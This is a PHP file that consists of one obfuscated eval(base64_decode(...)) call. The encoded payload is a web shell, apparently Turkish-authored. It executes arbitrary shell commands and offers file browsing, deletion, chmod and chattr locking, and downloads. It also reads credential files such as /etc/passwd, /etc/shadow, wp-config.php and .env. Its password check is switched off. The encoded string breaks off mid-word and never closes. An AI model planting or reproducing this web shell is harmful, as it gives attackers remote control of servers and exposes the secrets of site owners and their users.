<?php eval(base64_decode("PD9waHAKLy8gISEhISEgSEFUQSBBWUlLTEFNQSBBw4dJSyAtIMOHYWzEscWfxLFyc2Egc29ucmEga2FwYXQgISEhISEKZXJyb3JfcmVwb3J0aW5nKEVfQUxMKTsKaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAxKTsKaW5pX3NldCgnbG9nX2Vycm9ycycsIDEpOwovLyAhISEhISBIQVRBIEFZSUtMQU1BIFNPTlUgISEhISEKCiMgS29uZmlndXJhc3lvbgokU0hFTExfVkVSU0lPTiA9ICJ2OC4wICAiOwokc2F5ZmFTaWZyZWxlbWUgPScwJzsgLy8gMTogQcOnxLFrLCAwOiBLYXBhbMSxCiRrdWxsYW5pY2lBZGkgPSAnemV0YSc7IC8vIERFxJ7EsMWeVMSwUiBCVU5VIEFNSyEKJHNpZnJlID0gJ2thb3MnOyAgICAgIC8vIEJVTlUgREEgREXEnsSwxZ5UxLBSIQoKLy8gLS0tIE90dXJ1bSBZw7ZuZXRpbWkgKE1lc2FqbGFyIGnDp2luKSAtLS0KaWYgKHNlc3Npb25fc3RhdHVzKCkgPT0gUEhQX1NFU1NJT05fTk9ORSkgeyBAc2Vzc2lvbl9zdGFydCgpOyB9CgojIC0tLSBZZXRraSBLb250cm9sw7wgLS0tCmZ1bmN0aW9uIHlldGtpS29udHJvbCgka3VsbGFuaWNpQWRpLCAkc2lmcmUpIHsgLyogLi4uIMO2bmNla2kga29kIC4uLiAqLyBnbG9iYWwgJHNheWZhU2lmcmVsZW1lOyBpZigkc2F5ZmFTaWZyZWxlbWUgPT0nMScpIHsgaWYoZW1wdHkoJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXSkgfHwgZW1wdHkoJF9TRVJWRVJbJ1BIUF9BVVRIX1BXJ10pIHx8ICRfU0VSVkVSWydQSFBfQVVUSF9VU0VSJ10gIT0gJGt1bGxhbmljaUFkaSB8fCAkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSAhPSAkc2lmcmUpIHsgaGVhZGVyKCdXV1ctQXV0aGVudGljYXRlOiBCYXNpYyByZWFsbT0iIC0gQUNDRVNTIERFTklFRCInKTsgaGVhZGVyKCdIVFRQLzEuMCA0MDEgVW5hdXRob3JpemVkJyk7IGRpZSgnPCFET0NUWVBFIGh0bWw+PGh0bWw+PGhlYWQ+PHRpdGxlPkFDQ0VTUyBERU5JRUQ8L3RpdGxlPjxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kOiMwMDA7IGNvbG9yOiNmMDA7IGZvbnQtZmFtaWx5Om1vbm9zcGFjZTsgdGV4dC1hbGlnbjpjZW50ZXI7Ij48aDE+QUNDRVNTIERFTklFRCE8L2gxPjwvYm9keT48L2h0bWw+Jyk7IH0gfSB9CnlldGtpS29udHJvbCgka3VsbGFuaWNpQWRpLCAkc2lmcmUpOwoKLy8gLS0tIFRlbWVsIEhlbHBlciBGb25rc2l5b25sYXIgLS0tCmZ1bmN0aW9uIGZvcm1hdFNpemVVbml0cygkYnl0ZXMpIHsgLyogLi4uIMO2bmNla2kga29kIC4uLiAqLyBpZiAoJGJ5dGVzID09PSBmYWxzZSB8fCAkYnl0ZXMgPT09IG51bGwpIHJldHVybiAnPz8/JzsgaWYgKCRieXRlcyA+PSAxMDczNzQxODI0KSB7ICRieXRlcyA9IG51bWJlcl9mb3JtYXQoJGJ5dGVzIC8gMTA3Mzc0MTgyNCwgMikgLiAnIEdCJzsgfSBlbHNlaWYgKCRieXRlcyA+PSAxMDQ4NTc2KSB7ICRieXRlcyA9IG51bWJlcl9mb3JtYXQoJGJ5dGVzIC8gMTA0ODU3NiwgMikgLiAnIE1CJzsgfSBlbHNlaWYgKCRieXRlcyA+PSAxMDI0KSB7ICRieXRlcyA9IG51bWJlcl9mb3JtYXQoJGJ5dGVzIC8gMTAyNCwgMikgLiAnIEtCJzsgfSBlbHNlaWYgKCRieXRlcyA+IDEpIHsgJGJ5dGVzID0gJGJ5dGVzIC4gJyBieXRlcyc7IH0gZWxzZWlmICgkYnl0ZXMgPT0gMSkgeyAkYnl0ZXMgPSAkYnl0ZXMgLiAnIGJ5dGUnOyB9IGVsc2UgeyAkYnl0ZXMgPSAnMCBieXRlcyc7IH0gcmV0dXJuICRieXRlczsgfQpmdW5jdGlvbiBmaWxlRXh0ZW5zaW9uKCRmaWxlKSB7IC8qIC4uLiDDtm5jZWtpIGtvZCAuLi4gKi8gJGZpbGUgPSBydHJpbSgkZmlsZSwgJy8nKTsgJHBvcyA9IHN0cnJwb3MoJGZpbGUsICcuJyk7IGlmICgkcG9zID09PSBmYWxzZSkgeyByZXR1cm4gJyc7IH0gcmV0dXJuIHN1YnN0cigkZmlsZSwgJHBvcyArIDEpOyB9CmZ1bmN0aW9uIHBlcm1zX3RvX3N0cmluZygkcGVybXMpIHsKICAgIGlmICgkcGVybXMgPT09IGZhbHNlIHx8ICRwZXJtcyA9PT0gbnVsbCkgcmV0dXJuICc/Pz8/JzsKICAgICRpbmZvID0gJyc7CiAgICAvLyBEb3N5YSB0w7xyw7wgLSBUw5xNIFNBVElSTEFSSU4gU09OVU5EQSA7IE9MRFXEnlVOREFOIEVNxLBOIE9MQUxJTSEKICAgIGlmICgoJHBlcm1zICYgMHhDMDAwKSA9PSAweEMwMDApICRpbmZvID0gJ3MnOyAvLyBTb2NrZXQKICAgIGVsc2VpZiAoKCRwZXJtcyAmIDB4QTAwMCkgPT0gMHhBMDAwKSAkaW5mbyA9ICdsJzsgLy8gU3ltYm9saWMgTGluawogICAgZWxzZWlmICgoJHBlcm1zICYgMHg4MDAwKSA9PSAweDgwMDApICRpbmZvID0gJy0nOyAvLyBSZWd1bGFyCiAgICBlbHNlaWYgKCgkcGVybXMgJiAweDYwMDApID09IDB4NjAwMCkgJGluZm8gPSAnYic7IC8vIEJsb2NrIHNwZWNpYWwgIDwtLSBCdXJhc8SxIHZleWEgw7ZuY2VzaSBvbGFiaWxpcgogICAgZWxzZWlmICgoJHBlcm1zICYgMHg0MDAwKSA9PSAweDQwMDApICRpbmZvID0gJ2QnOyAvLyBEaXJlY3RvcnkKICAgIGVsc2VpZiAoKCRwZXJtcyAmIDB4MjAwMCkgPT0gMHgyMDAwKSAkaW5mbyA9ICdjJzsgLy8gQ2hhcmFjdGVyIHNwZWNpYWwKICAgIGVsc2VpZiAoKCRwZXJtcyAmIDB4MTAwMCkgPT0gMHgxMDAwKSAkaW5mbyA9ICdwJzsgLy8gRklGTyBwaXBlCiAgICBlbHNlICRpbmZvID0gJ3UnOyAvLyBVbmtub3duCgogICAgLy8gxLB6aW5sZXIKICAgICRpbmZvIC49ICgoJHBlcm1zICYgMHgwMTAwKSA/ICdyJyA6ICctJyk7ICRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDgwKSA/ICd3JyA6ICctJyk7ICRpbmZvIC49ICgoJHBlcm1zICYgMHgwMDQwKSA/ICgoJHBlcm1zICYgMHgwODAwKSA/ICdzJyA6ICd4JyApIDogKCgkcGVybXMgJiAweDA4MDApID8gJ1MnIDogJy0nKSk7CiAgICAkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAyMCkgPyAncicgOiAnLScpOyAkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAxMCkgPyAndycgOiAnLScpOyAkaW5mbyAuPSAoKCRwZXJtcyAmIDB4MDAwOCkgPyAoKCRwZXJtcyAmIDB4MDQwMCkgPyAncycgOiAneCcgKSA6ICgoJHBlcm1zICYgMHgwNDAwKSA/ICdTJyA6ICctJykpOwogICAgJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDQpID8gJ3InIDogJy0nKTsgJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDIpID8gJ3cnIDogJy0nKTsgJGluZm8gLj0gKCgkcGVybXMgJiAweDAwMDEpID8gKCgkcGVybXMgJiAweDAyMDApID8gJ3QnIDogJ3gnICkgOiAoKCRwZXJtcyAmIDB4MDIwMCkgPyAnVCcgOiAnLScpKTsKICAgIHJldHVybiAkaW5mbzsKfSAvLyBGb25rc2l5b251biBrYXBhbmTEscSfxLFuZGFuIGVtaW4gb2xhbMSxbQpmdW5jdGlvbiBlbmNvZGVQYXRoKCRwYXRoKSB7IHJldHVybiBzdHJfcmVwbGFjZShhcnJheSgnLycsICdcXCcpLCBhcnJheSgnX19TTEFTSF9fJywgJ19fQlNMQVNIX18nKSwgJHBhdGgpOyB9CmZ1bmN0aW9uIGRlY29kZVBhdGgoJHBhdGgpIHsgcmV0dXJuIHN0cl9yZXBsYWNlKGFycmF5KCdfX1NMQVNIX18nLCAnX19CU0xBU0hfXycpLCBhcnJheSgnLycsICdcXCcpLCAkcGF0aCk7IH0KZnVuY3Rpb24gcnVuQ29tbWFuZCgkY21kKSB7IC8qIC4uLiDDtm5jZWtpIGtvZCAuLi4gKi8gJG91dHB1dCA9ICcnOyAkZXJyb3IgPSAnJzsgJHJldF92YWwgPSAtMTsgaWYgKGZ1bmN0aW9uX2V4aXN0cygnc2hlbGxfZXhlYycpKSB7ICRvdXRwdXQgPSBzaGVsbF9leGVjKCRjbWQgLiAnIDI+JjEnKTsgfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpIHsgb2Jfc3RhcnQoKTsgc3lzdGVtKCRjbWQgLiAnIDI+JjEnLCAkcmV0X3ZhbCk7ICRvdXRwdXQgPSBvYl9nZXRfY29udGVudHMoKTsgb2JfZW5kX2NsZWFuKCk7IH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ3Bhc3N0aHJ1JykpIHsgb2Jfc3RhcnQoKTsgcGFzc3RocnUoJGNtZCAuICcgMj4mMScsICRyZXRfdmFsKTsgJG91dHB1dCA9IG9iX2dldF9jb250ZW50cygpOyBvYl9lbmRfY2xlYW4oKTsgfSBlbHNlaWYgKGZ1bmN0aW9uX2V4aXN0cygnZXhlYycpKSB7IGV4ZWMoJGNtZCAuICcgMj4mMScsICRvdXRwdXRfYXJyYXksICRyZXRfdmFsKTsgJG91dHB1dCA9IGltcGxvZGUoIlxuIiwgJG91dHB1dF9hcnJheSk7IH0gZWxzZWlmIChmdW5jdGlvbl9leGlzdHMoJ3Byb2Nfb3BlbicpKSB7ICRkZXNjcmlwdG9yc3BlYyA9IGFycmF5KCAwID0+IGFycmF5KCJwaXBlIiwgInIiKSwgMSA9PiBhcnJheSgicGlwZSIsICJ3IiksIDIgPT4gYXJyYXkoInBpcGUiLCAidyIpICk7ICRwcm9jZXNzID0gcHJvY19vcGVuKCRjbWQsICRkZXNjcmlwdG9yc3BlYywgJHBpcGVzKTsgaWYgKGlzX3Jlc291cmNlKCRwcm9jZXNzKSkgeyBmY2xvc2UoJHBpcGVzWzBdKTsgJG91dHB1dCA9IHN0cmVhbV9nZXRfY29udGVudHMoJHBpcGVzWzFdKTsgZmNsb3NlKCRwaXBlc1sxXSk7ICRlcnJvciA9IHN0cmVhbV9nZXRfY29udGVudHMoJHBpcGVzWzJdKTsgZmNsb3NlKCRwaXBlc1syXSk7ICRyZXRfdmFsID0gcHJvY19jbG9zZSgkcHJvY2Vzcyk7IGlmICghZW1wdHkoJGVycm9yKSkgJG91dHB1dCAuPSAiXG5TVERFUlI6XG4iIC4gJGVycm9yOyB9IGVsc2UgeyAkb3V0cHV0ID0gInByb2Nfb3BlbiBmYWlsZWQuIjsgfSB9IGVsc2UgeyAkb3V0cHV0ID0gIkNvbW1hbmQgZXhlY3V0aW9uIGZ1bmN0aW9ucyBhcmUgZGlzYWJsZWQuIjsgfSByZXR1cm4gYXJyYXkoJ291dHB1dCcgPT4gaHRtbHNwZWNpYWxjaGFycyh0cmltKCRvdXRwdXQpKSwgJ3JldHZhbCcgPT4gJHJldF92YWwpOyB9CgovLyAtLS0gUEFUSCBCZWxpcmxlbWUgLS0tCiRzY3JpcHRfcGF0aCA9IGRpcm5hbWUoX19GSUxFX18pOyAkZG9jX3Jvb3QgPSBpc3NldCgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKSA/ICRfU0VSVkVSWydET0NVTUVOVF9ST09UJ10gOiAkc2NyaXB0X3BhdGg7ICRjdXJyZW50X3BhdGggPSAkc2NyaXB0X3BhdGg7CmlmIChpc3NldCgkX0dFVFsncCddKSkgeyAkZGVjb2RlZF9wID0gZGVjb2RlUGF0aCgkX0dFVFsncCddKTsgJHJlc29sdmVkX3BhdGggPSBAcmVhbHBhdGgoJGRlY29kZWRfcCk7IGlmICgkcmVzb2x2ZWRfcGF0aCAhPT0gZmFsc2UgJiYgQGlzX3JlYWRhYmxlKCRyZXNvbHZlZF9wYXRoKSkgeyAkY3VycmVudF9wYXRoID0gJHJlc29sdmVkX3BhdGg7IH0gZWxzZWlmIChAZmlsZV9leGlzdHMoJGRlY29kZWRfcCkgJiYgQGlzX3JlYWRhYmxlKCRkZWNvZGVkX3ApKSB7ICRjdXJyZW50X3BhdGggPSAkZGVjb2RlZF9wOyB9IGVsc2UgeyAkY3VycmVudF9wYXRoID0gJHNjcmlwdF9wYXRoOyAkX1NFU1NJT05bJ21lc3NhZ2UnXSA9ICdHZcOnZXJzaXogdmV5YSBva3VuYW1heWFuIHlvbCEnOyAkX1NFU1NJT05bJ21lc3NhZ2VfdHlwZSddID0gJ2Vycm9yJzsgfSB9CiRjdXJyZW50X3BhdGggPSBzdHJfcmVwbGFjZSgnXFwnLCAnLycsICRjdXJyZW50X3BhdGgpOyBpZiAoJGN1cnJlbnRfcGF0aCAhPT0gJy8nKSB7ICRjdXJyZW50X3BhdGggPSBydHJpbSgkY3VycmVudF9wYXRoLCAnLycpOyB9IGlmIChlbXB0eSgkY3VycmVudF9wYXRoKSkgeyAkY3VycmVudF9wYXRoID0gJy8nOyB9CmRlZmluZSgiUEFUSCIsICRjdXJyZW50X3BhdGgpOwoKLy8gLS0tIMSwa29uIEZvbmtzaXlvbnUgLS0tCmZ1bmN0aW9uIGZpbGVJY29uKCRmaWxlKSB7IC8qIC4uLiDDtm5jZWtpIGtvZCAuLi4gKi8gJGZ1bGxfcGF0aCA9IFBBVEggLiAnLycgLiAkZmlsZTsgJGltZ3MgPSBhcnJheSgiYXBuZyIsICJhdmlmIiwgImdpZiIsICJqcGciLCAianBlZyIsICJqZmlmIiwgInBqcGVnIiwgInBqcCIsICJwbmciLCAic3ZnIiwgIndlYnAiLCAiaWNvIik7ICRhdWRpbyA9IGFycmF5KCJ3YXYiLCAibTRhIiwgIm00YiIsICJtcDMiLCAib2dnIiwgIndlYm0iLCAibXBjIiwgImZsYWMiKTsgJHZpZGVvID0gYXJyYXkoIm1wNCIsICJtb3YiLCAiYXZpIiwgIm1rdiIsICJ3ZWJtIiwgImZsdiIsICJ3bXYiKTsgJGNvZGUgPSBhcnJheSgicGhwIiwgInBodG1sIiwgImh0bWwiLCAiaHRtIiwgImNzcyIsICJqcyIsICJweSIsICJzaCIsICJqc29uIiwgInhtbCIsICJzcWwiLCAiYyIsICJjcHAiLCAiamF2YSIsICJyYiIsICJnbyIsICJzd2lmdCIsICJrdCIsICJ0cGwiLCAiaW5pIiwgImNvbmYiKTsgJGFyY2hpdmUgPSBhcnJheSgiemlwIiwgInJhciIsICJ0YXIiLCAiZ3oiLCAiN3oiLCAiYnoyIiwgInh6Iik7ICRkb2MgPSBhcnJheSgicGRmIiwgImRvYyIsICJkb2N4IiwgInhscyIsICJ4bHN4IiwgInBwdCIsICJwcHR4IiwgIm9kdCIsICJvZHMiLCAib2RwIik7ICRleHQgPSBzdHJ0b2xvd2VyKGZpbGVFeHRlbnNpb24oJGZpbGUpKTsgaWYgKEBpc19kaXIoJGZ1bGxfcGF0aCkpIHJldHVybiAnPGkgY2xhc3M9ImZhcyBmYS1mb2xkZXItb3BlbiBoYWNrZXItaWNvbi1mb2xkZXIiPjwvaT4gJzsgaWYgKCRmaWxlID09ICJlcnJvcl9sb2ciKSByZXR1cm4gJzxpIGNsYXNzPSJmYXMgZmEtYnVnIGhhY2tlci1pY29uLWVycm9yIj48L2k+ICc7IGlmICgkZmlsZSA9PSAiLmh0YWNjZXNzIiB8fCAkZmlsZSA9PSAiLmh0cGFzc3dkIiB8fCAkZmlsZSA9PSAiY29uZmlnIiB8fCBzdHJwb3MoJGZpbGUsICcuY29uZicpICE9PSBmYWxzZSB8fCBzdHJwb3MoJGZpbGUsICcuaW5pJykgIT09IGZhbHNlKSByZXR1cm4gJzxpIGNsYXNzPSJmYXMgZmEtY29ncyBoYWNrZXItaWNvbi1jb25maWciPjwvaT4gJzsgaWYgKGluX2FycmF5KCRleHQsICRjb2RlKSkgcmV0dXJuICc8aSBjbGFzcz0iZmFzIGZhLWNvZGUgaGFja2VyLWljb24tY29kZSI+PC9pPiAnOyBpZiAoaW5fYXJyYXkoJGV4dCwgJGltZ3MpKSByZXR1cm4gJzxpIGNsYXNzPSJmYXMgZmEtZmlsZS1pbWFnZSBoYWNrZXItaWNvbi1pbWFnZSI+PC9pPiAnOyBpZiAoaW5fYXJyYXkoJGV4dCwgJGF1ZGlvKSkgcmV0dXJuICc8aSBjbGFzcz0iZmFzIGZhLWZpbGUtYXVkaW8gaGFja2VyLWljb24tYXVkaW8iPjwvaT4gJzsgaWYgKGluX2FycmF5KCRleHQsICR2aWRlbykpIHJldHVybiAnPGkgY2xhc3M9ImZhcyBmYS1maWxlLXZpZGVvIGhhY2tlci1pY29uLXZpZGVvIj48L2k+ICc7IGlmIChpbl9hcnJheSgkZXh0LCAkYXJjaGl2ZSkpIHJldHVybiAnPGkgY2xhc3M9ImZhcyBmYS1maWxlLWFyY2hpdmUgaGFja2VyLWljb24tYXJjaGl2ZSI+PC9pPiAnOyBpZiAoaW5fYXJyYXkoJGV4dCwgJGRvYykpIHJldHVybiAnPGkgY2xhc3M9ImZhcyBmYS1maWxlLXBkZiBoYWNrZXItaWNvbi1kb2MiPjwvaT4gJzsgaWYgKCRleHQgPT0gInR4dCIgfHwgJGV4dCA9PSAibWQiIHx8ICRleHQgPT0gImxvZyIpIHJldHVybiAnPGkgY2xhc3M9ImZhcyBmYS1maWxlLWFsdCBoYWNrZXItaWNvbi10ZXh0Ij48L2k+ICc7IHJldHVybiAnPGkgY2xhc3M9ImZhcyBmYS1maWxlIGhhY2tlci1pY29uLWRlZmF1bHQiPjwvaT4gJzsgfQoKLy8gLS0tIFBPU1QgdmUgR0VUIMSwxZ9sZW1sZXJpIC0tLQokbWVzc2FnZSA9IGlzc2V0KCRfU0VTU0lPTlsnbWVzc2FnZSddKSA/ICRfU0VTU0lPTlsnbWVzc2FnZSddIDogJyc7ICRtZXNzYWdlX3R5cGUgPSBpc3NldCgkX1NFU1NJT05bJ21lc3NhZ2VfdHlwZSddKSA/ICRfU0VTU0lPTlsnbWVzc2FnZV90eXBlJ10gOiAnJzsgdW5zZXQoJF9TRVNTSU9OWydtZXNzYWdlJ10sICRfU0VTU0lPTlsnbWVzc2FnZV90eXBlJ10pOwokYWN0aW9uX3Jlc3VsdF9vdXRwdXQgPSAnJzsgLy8gS29tdXQsIGFuYWxpeiB2Yi4gw6fEsWt0xLFsYXIgacOnaW4KCi8vIEdFVCDEsMWfbGVtbGVyaQppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdHRVQnKSB7IC8qIC4uLiDDtm5jZWtpIEdFVCBpxZ9sZW1sZXJpIC4uLiAqLyBpZiAoaXNzZXQoJF9HRVRbJ2NobW9kJ10pICYmIGlzc2V0KCRfR0VUWydmaWxlJ10pKSB7IC8qIGNobW9kICovICRmaWxlX3RvX2NobW9kID0gUEFUSCAuICcvJyAuIHVybGRlY29kZSgkX0dFVFsnZmlsZSddKTsgJG5ld19wZXJtID0gaW50dmFsKCRfR0VUWydjaG1vZCddLCA4KTsgaWYgKGZpbGVfZXhpc3RzKCRmaWxlX3RvX2NobW9kKSkgeyBpZiAoQGNobW9kKCRmaWxlX3RvX2NobW9kLCAkbmV3X3Blcm0pKSB7ICRfU0VTU0lPTlsnbWVzc2FnZSddID0gJ1Blcm1zIHNldCB0byAnIC4gc3ByaW50ZignJW8nLCAkbmV3X3Blcm0pIC4gJyEnOyAkX1NFU1NJT05bJ21lc3NhZ2VfdHlwZSddID0gJ3N1Y2Nlc3MnOyB9IGVsc2UgeyAkX1NFU1NJT05bJ21lc3NhZ2UnXSA9ICdFcnJvcjogQ2htb2QgZmFpbGVkISc7ICRfU0VTU0lPTlsnbWVzc2FnZV90eXBlJ10gPSAnZXJyb3InOyB9IH0gZWxzZSB7ICRfU0VTU0lPTlsnbWVzc2FnZSddID0gJ0Vycm9yOiBGaWxlIG5vdCBmb3VuZCEnOyAkX1NFU1NJT05bJ21lc3NhZ2VfdHlwZSddID0gJ2Vycm9yJzsgfSBoZWFkZXIoJ0xvY2F0aW9uOiA/cD0nIC4gdXJsZW5jb2RlKGVuY29kZVBhdGgoUEFUSCkpKTsgZXhpdDsgfSBpZiAoaXNzZXQoJF9HRVRbJ2NoYXR0ciddKSAmJiBpc3NldCgkX0dFVFsnZmlsZSddKSkgeyAvKiBjaGF0dHIgKi8gJGZpbGVfdG9fY2hhdHRyID0gUEFUSCAuICcvJyAuIHVybGRlY29kZSgkX0dFVFsnZmlsZSddKTsgJGF0dHJfY21kID0gJF9HRVRbJ2NoYXR0ciddID09ICdsb2NrJyA/ICcraScgOiAnLWknOyAkY29tbWFuZCA9ICJjaGF0dHIgIiAuICRhdHRyX2NtZCAuICIgIiAuIGVzY2FwZXNoZWxsYXJnKCRmaWxlX3RvX2NoYXR0cik7ICRjbWRfcmVzdWx0ID0gcnVuQ29tbWFuZCgkY29tbWFuZCk7IGlmIChzdHJpcG9zKCRjbWRfcmVzdWx0WydvdXRwdXQnXSwgJ09wZXJhdGlvbiBub3QgcGVybWl0dGVkJykgPT09IGZhbHNlICYmIHN0cmlwb3MoJGNtZF9yZXN1bHRbJ291dHB1dCddLCAnTm8gc3VjaCBmaWxlJykgPT09IGZhbHNlICYmIHN0cmlwb3MoJGNtZF9yZXN1bHRbJ291dHB1dCddLCAnY29tbWFuZCBub3QgZm91bmQnKSA9PT0gZmFsc2UgJiYgJGNtZF9yZXN1bHRbJ3JldHZhbCddIDw9IDEpIHsgJF9TRVNTSU9OWydtZXNzYWdlJ10gPSAnY2hhdHRyICcgLiAkYXR0cl9jbWQgLiAnIGF0dGVtcHRlZC4nOyAkX1NFU1NJT05bJ21lc3NhZ2VfdHlwZSddID0gJ3N1Y2Nlc3MnOyB9IGVsc2UgeyAkX1NFU1NJT05bJ21lc3NhZ2UnXSA9ICdFcnJvcjogY2hhdHRyIGZhaWxlZDogJyAuICRjbWRfcmVzdWx0WydvdXRwdXQnXTsgJF9TRVNTSU9OWydtZXNzYWdlX3R5cGUnXSA9ICdlcnJvcic7IH0gaGVhZGVyKCdMb2NhdGlvbjogP3A9JyAuIHVybGVuY29kZShlbmNvZGVQYXRoKFBBVEgpKSk7IGV4aXQ7IH0gaWYgKGlzc2V0KCRfR0VUWydkJ10pICYmIGlzc2V0KCRfR0VUWydmaWxlJ10pKSB7IC8qIGRlbGV0ZSAqLyAkaXRlbV90b19kZWxldGUgPSB1cmxkZWNvZGUoJF9HRVRbJ2ZpbGUnXSk7ICRpdGVtX3BhdGggPSBQQVRIIC4gIi8iIC4gJGl0ZW1fdG9fZGVsZXRlOyAkc3VjY2VzcyA9IGZhbHNlOyAkZXJyb3JfbXNnID0gJ1Vua25vd24gZXJyb3IhJzsgaWYgKCFmaWxlX2V4aXN0cygkaXRlbV9wYXRoKSkgeyAkZXJyb3JfbXNnID0gJ0l0ZW0gbm90IGZvdW5kISc7IH0gZWxzZWlmIChpc19maWxlKCRpdGVtX3BhdGgpKSB7IGlmIChAdW5saW5rKCRpdGVtX3BhdGgpKSB7ICRzdWNjZXNzID0gdHJ1ZTsgJG1zZyA9ICdGaWxlIGRlbGV0ZWQhJzsgfSBlbHNlIHsgJGVycm9yX21zZyA9ICdGaWxlIGRlbGV0aW9uIGZhaWxlZCEnOyB9IH0gZWxzZWlmIChpc19kaXIoJGl0ZW1fcGF0aCkpIHsgaWYgKEBybWRpcigkaXRlbV9wYXRoKSkgeyAkc3VjY2VzcyA9IHRydWU7ICRtc2cgPSAnRGlyZWN0b3J5IGRlbGV0ZWQgKGVtcHR5KSEnOyB9IGVsc2UgeyAkZXJyb3JfbXNnID0gJ0RpcmVjdG9yeSBkZWxldGlvbiBmYWlsZWQgKG5vdCBlbXB0eS9wZXJtcykhJzsgfSB9IGlmICgkc3VjY2VzcykgeyAkX1NFU1NJT05bJ21lc3NhZ2UnXSA9ICRtc2c7ICRfU0VTU0lPTlsnbWVzc2FnZV90eXBlJ10gPSAnc3VjY2Vzcyc7IH0gZWxzZSB7ICRfU0VTU0lPTlsnbWVzc2FnZSddID0gJ0Vycm9yOiAnIC4gJGVycm9yX21zZzsgJF9TRVNTSU9OWydtZXNzYWdlX3R5cGUnXSA9ICdlcnJvcic7IH0gaGVhZGVyKCdMb2NhdGlvbjogP3A9JyAuIHVybGVuY29kZShlbmNvZGVQYXRoKFBBVEgpKSk7IGV4aXQ7IH0gaWYgKGlzc2V0KCRfR0VUWydkbCddKSAmJiBpc3NldCgkX0dFVFsnZmlsZSddKSkgeyAvKiBkb3dubG9hZCAqLyAkZmlsZV90b19kb3dubG9hZCA9IHVybGRlY29kZSgkX0dFVFsnZmlsZSddKTsgJGZpbGVfcGF0aCA9IFBBVEggLiAiLyIgLiAkZmlsZV90b19kb3dubG9hZDsgaWYgKCFpc19maWxlKCRmaWxlX3BhdGgpKSB7ICRfU0VTU0lPTlsnbWVzc2FnZSddPSdFcnJvcjogTm90IGEgZmlsZSEnOyAkX1NFU1NJT05bJ21lc3NhZ2VfdHlwZSddPSdlcnJvcic7IGhlYWRlcignTG9jYXRpb246ID9wPScgLiB1cmxlbmNvZGUoZW5jb2RlUGF0aChQQVRIKSkpOyBleGl0OyB9IGVsc2VpZiAoIWlzX3JlYWRhYmxlKCRmaWxlX3BhdGgpKSB7ICRfU0VTU0lPTlsnbWVzc2FnZSddPSdFcnJvcjogQ2Fubm90IHJlYWQgZmlsZSEnOyAkX1NFU1NJT05bJ21lc3NhZ2VfdHlwZSddPSdlcnJvcic7IGhlYWRlcignTG9jYXRpb246ID9wPScgLiB1cmxlbmNvZGUoZW5jb2RlUGF0aChQQVRIKSkpOyBleGl0OyB9IGVsc2UgeyBoZWFkZXIoJ0NvbnRlbnQtRGVzY3JpcHRpb246IEZpbGUgVHJhbnNmZXInKTsgaGVhZGVyKCdDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbScpOyBoZWFkZXIoJ0NvbnRlbnQtRGlzcG9zaXRpb246IGF0dGFjaG1lbnQ7IGZpbGVuYW1lPSInIC4gYmFzZW5hbWUoJGZpbGVfcGF0aCkgLiAnIicpOyBoZWFkZXIoJ0V4cGlyZXM6IDAnKTsgaGVhZGVyKCdDYWNoZS1Db250cm9sOiBtdXN0LXJldmFsaWRhdGUnKTsgaGVhZGVyKCdQcmFnbWE6IHB1YmxpYycpOyBoZWFkZXIoJ0NvbnRlbnQtTGVuZ3RoOiAnIC4gZmlsZXNpemUoJGZpbGVfcGF0aCkpOyBAb2JfY2xlYW4oKTsgQGZsdXNoKCk7IEByZWFkZmlsZSgkZmlsZV9wYXRoKTsgZXhpdDsgfSB9IGlmIChpc3NldCgkX0dFVFsncmVhZF9jb25maWcnXSkpIHsgLyogcmVhZCBjb25maWcgKi8gJGNvbmZpZ19maWxlID0gJyc7ICRjb21tb25fY29uZmlncyA9IGFycmF5KCAncGFzc3dkJyA9PiAnL2V0Yy9wYXNzd2QnLCAnc2hhZG93JyA9PiAnL2V0Yy9zaGFkb3cnLCAnd3Bjb25maWcnID0+IFBBVEggLiAnL3dwLWNvbmZpZy5waHAnLCAnd3Bjb25maWdfdXAnID0+IGRpcm5hbWUoUEFUSCkgLiAnL3dwLWNvbmZpZy5waHAnLCAnZW52JyA9PiBQQVRIIC4gJy8uZW52JywgJ2Vudl91cCcgPT4gZGlybmFtZShQQVRIKSAuICcvLmVudicsICdhcGFjaGVfY29uZicgPT4gJy9ldGMvYXBhY2hlMi9hcGFjaGUyLmNvbmYnLCAnbmdpbnhfY29uZicgPT4gJy9ldGMvbmdpbngvbmdpbnguY29uZicsICdwaHBfaW5pJyA9PiBwaHBfaW5pX2xvYWRlZF9maWxlKCkgPzogJy9ldGMvcGhwL3BocC5pbmknICk7IGlmIChpc3NldCgkY29tbW9uX2NvbmZpZ3NbJF9HRVRbJ3JlYWRfY29uZmlnJ11dKSkgeyAkY29uZmlnX2ZpbGUgPSAkY29tbW9uX2NvbmZpZ3NbJF9HRVRbJ3JlYWRfY29uZmlnJ11dOyB9ICRjb25maWdfY29udGVudCA9IEBmaWxlX2dldF9jb250ZW50cygkY29uZmlnX2ZpbGUpOyBpZiAoJGNvbmZpZ19jb250ZW50ICE9PSBmYWxzZSkgeyAkYWN0aW9uX3Jlc3VsdF9vdXRwdXQgPSAiLS0tIENvbnRlbnQgb2YgIiAuIGh0bWxzcGVjaWFsY2hhcnMoJGNvbmZpZ19maWxlKSAuICIgLS0tXG5cbiIgLiBodG1sc3BlY2lhbGNoYXJzKCRjb25maWdfY29udGVudCk7IH0gZWxzZWlmICghZW1wdHkoJGNvbmZpZ19maWxlKSkgeyAkYWN0aW9uX3Jlc3VsdF9vdXRwdXQgPSAiRXJyb3I6IENhbm5vdCByZWFkICIgLiBodG1sc3BlY2lhbGNoYXJzKCRjb25maWdfZmlsZSk7IH0gZWxzZSB7ICRhY3Rpb25fcmVzdWx0X291dHB1dCA9ICJFcnJvcjogVW5rbm93biBjb25maWcgZmlsZSByZXF1ZXN0ZWQuIjsgfSB9IH0KCi8vIFBPU